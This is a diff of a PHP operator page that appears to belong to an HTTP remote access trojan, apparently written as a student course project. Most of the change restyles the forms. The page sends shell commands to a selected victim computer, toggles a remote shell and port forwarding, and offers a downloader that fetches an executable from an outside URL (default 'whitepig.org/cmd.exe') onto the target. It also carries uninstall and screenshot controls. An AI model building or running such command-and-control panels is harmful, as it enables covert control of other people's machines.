@@ -1,7 +1,7 @@
-﻿<?php
-
+<?php
+require('header.php'); //一定要以无BOM格式存
 require("config.php");
-require_once("httprat.php");
+
 
 error_reporting(E_ALL ^ E_NOTICE);//显示除去 E_NOTICE 之外的所有错误信息
 
@@ -13,7 +13,8 @@ if(mysqli_connect_error())
 }
 
 $idin=$_GET["id"];
-
+if (!$idin)
+	exit();
 if(isset($_SESSION["admin"]))
 {       
 
@@ -39,45 +40,57 @@ if(isset($_SESSION["admin"]))
 
 	echo '<div id="options">';
 	echo '<p align="center">';
-	echo 'Current Computer_id:'.$idin.'<br/><br/>';
-	if (($timenow - strtotime($shellLT)) <= 4) echo 'Shell:<a href="submit.php?'.'id='.$idin.'&do=shelloff">On</a>&nbsp';
-	else echo 'Shell:<a href="submit.php?'.'id='.$idin.'&do=shellon">Off</a>&nbsp';
-
-	if (($timenow - strtotime($tranLT)) <= 4) 
-		echo 'Ports Transmiting:<a href="submit.php?'.'id='.$idin.'&do=tranoff">On</a>&nbsp';
+	echo 'Current Computer_id：'.$idin.'<br/><br/>';
+	if (($timenow - strtotime($shellLT)) <= 4) 
+		echo 'Shell：<a href="submit.php?'.'id='.$idin.'&do=shelloff"><span class="label label-info">On<span></a>&nbsp';
 	else 
-		echo 'Ports Transmiting:<a href="submit.php?'.'id='.$idin.'&do=tranon">Off</a>&nbsp';
+		echo 'Shell：<a href="submit.php?'.'id='.$idin.'&do=shellon"><span class="label label-default">Off</span></a>&nbsp';
+
+	echo '&nbsp;&nbsp;&nbsp;&nbsp;';
+	if (($timenow - strtotime($tranLT)) <= 4) 
+		echo 'Ports Transmiting：<a href="submit.php?'.'id='.$idin.'&do=tranoff"><span class="label label-info">On<span></a>&nbsp';
+	else 
+		echo 'Ports Transmiting：<a href="submit.php?'.'id='.$idin.'&do=tranon"><span class="label label-default">Off</span></a>&nbsp';
 
 	echo '&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a href="submit.php?'.'id='.$idin.'&do=unistall">Uninstall it</a>&nbsp';
 	echo '</p>';
 
-	echo '<form action="submit.php" method="post">
-		<p align="center">command: <input type="text" name="shell" style="width:474px;" value="ipconfig" />&nbsp<input type="hidden" name="id" value='.$idin.' />
-		<input type="submit" value="Send Shell Cmd">
-		</p>
+	echo 
+		'<form action="submit.php?id='.$idin.'" method="post">
+		<div class="func-title float-left">shell command:</div>
+		<input class="form-control float-left" type="text" name="shell"  value="ipconfig" />&nbsp<input type="hidden" name="id" value='.$idin.' />
+		<input class="btn btn-primary" type="submit" value="Send Shell Cmd">
 		</form>';//shell表单
 
 
-	echo '<form action="submit.php" method="post">
-		<p align="center">ports to transmit: <input type="text" name="ports" value="1000:4000" />&nbsp<input type="hidden" name="id" value='.$idin.' />
-		<input type="submit" value="Send Transmit Cmd">
-		</p>
+	echo '<form action="submit.php?id='.$idin.'" method="post">
+		<div class="func-title float-left">ports to transmit: </div>
+		<input class="form-control float-left" type="text" name="ports" value="1000:4000" />&nbsp;
+		<input type="hidden" name="id" value='.$idin.' />
+		<input class="btn btn-primary" type="submit" value="Send Transmit Cmd">
 		</form>';//端口转发表单
 
-	echo '<form action="submit.php" method="post">
-		<p align="center">url: <input type="text" name="url" style="width:250px;" value="http://www.whitepig.org/cmd.exe" />&nbspfilename:<input type="text" name="filename" style="width:150px;" value="c:/test.exe" />&nbsp<input type="hidden" name="id" value='.$idin.' />
-		<input type="submit" value="Send Download Cmd">
-		</p>
+	echo '<form action="submit.php?id='.$idin.'" method="post">
+		<div class="func-title float-left">downloader: </div>
+		<input class="form-control float-left" type="text" name="url" style="width:300px;" value="http://www.whitepig.org/cmd.exe" />
+		<input class="form-control float-left" type="text" name="filename" style="width:170px;" value="c:/test.exe" />&nbsp;
+		<input type="hidden" name="id" value='.$idin.' />
+		<input class="btn btn-primary" type="submit" value="Send Download Cmd">
 		</form>';//download表单
 
-	echo '<form action="submit.php" method="post">
-		<p align="center"><input type="hidden" name="snap" value="snap" />&nbsp<input type="hidden" name="id" value='.$idin.' />
+	/* 2015-01-12 做课程设计的时候，因无法截屏，暂时注释掉
+		echo '<form action="submit.php" method="post">
+		<p align="center"><input type="hidden" name="snap" value="snap" />&nbsp;
+		<input type="hidden" name="id" value='.$idin.' />
 		<input type="submit" value="Send Snap Cmd">
 		</p>
 		</form>';//截屏表单
-
-	echo '<p align="center"><a href="submit.php?'.'id='.$idin.'">Refresh</a></p>';
-	echo '</div>';
+	*/
+	
+	echo 
+	'<p align="center"><a href="submit.php?'.'id='.$idin.'">Refresh</a></p>
+	</div>';
+	
 	if(file_exists("upload/temp.jpg"))
 	{
 		echo 'Screen Pic:</br>
@@ -204,4 +217,5 @@ if(($_GET["id"]!=NULL)&&($_GET["do"] == "delete"))
 
 $mysqli->close();
 
+require('footer.php');
 ?>
